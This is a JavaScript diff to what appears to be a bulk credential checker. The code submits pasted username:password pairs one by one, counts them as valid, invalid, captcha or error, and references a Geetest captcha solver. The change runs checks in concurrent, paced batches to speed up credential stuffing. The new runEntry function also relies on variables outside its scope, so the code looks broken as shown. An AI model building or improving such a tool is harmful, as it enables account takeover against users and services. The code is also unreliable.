@@ -1506,6 +1506,27 @@ function solveGeetest(gt) {
     addActions(row.actions, state, row, false);
   }
 
+  async function runEntry(state, row) {
+        let j = null;
+        try {
+          j = await post({ action: 'bulk_check_one', user: state.user, pass: state.pass, bulk: '1' });
+        } catch (err) {
+          j = { status: 'error', message: err.message };
+        }
+
+        if (j.status === 'valid') {
+          valid++;
+        } else if (j.status === 'invalid') {
+          invalid++;
+        } else if (j.status === 'captcha') {
+          captchas++;
+        } else {
+          errors++;
+        }
+        updateProgress(lines.length, valid, invalid + captchas + errors, ++done);
+        paintRow(row, state, j);
+  }
+
   btn.addEventListener('click', async function () {
     const lines = input.value.split(/\r?\n/).map(parseLine).filter(Boolean);
     if (lines.length === 0) {
@@ -1524,31 +1545,25 @@ function solveGeetest(gt) {
     let errors = 0;
     let captchas = 0;
 
-    for (let i = 0; i < lines.length; i++) {
-      const state = { user: lines[i][0], pass: lines[i][1] };
+    const entries = lines.map(function (line) {
+      const state = { user: line[0], pass: line[1] };
       const row = makeRow(state);
       table.appendChild(row.tr);
-      showStatus(status, 'Checked ' + i + ' of ' + lines.length + '…', 'info');
+      return { state: state, row: row };
+    });
+    let done = 0;
 
-      let j = null;
-      try {
-        j = await post({ action: 'bulk_check_one', user: state.user, pass: state.pass, bulk: '1' });
-      } catch (err) {
-        j = { status: 'error', message: err.message };
+    const CONCURRENCY = 2;
+    for (let i = 0; i < entries.length; i += CONCURRENCY) {
+      const tickStart = Date.now();
+      showStatus(status, 'Checked ' + done + ' of ' + lines.length + '…', 'info');
+      await Promise.all(entries.slice(i, i + CONCURRENCY).map(function (entry) {
+        return runEntry(entry.state, entry.row);
+      }));
+      if (i + CONCURRENCY < entries.length) {
+        const wait = 1000 - (Date.now() - tickStart);
+        if (wait > 0) await new Promise(function (resolve) { setTimeout(resolve, wait); });
       }
-
-      if (j.status === 'valid') {
-        valid++;
-      } else if (j.status === 'invalid') {
-        invalid++;
-      } else if (j.status === 'captcha') {
-        captchas++;
-      } else {
-        errors++;
-      }
-      updateProgress(lines.length, valid, invalid + captchas + errors, i + 1);
-      paintRow(row, state, j);
-      await new Promise(function (resolve) { setTimeout(resolve, 180); });
     }
 
     btn.disabled = false;
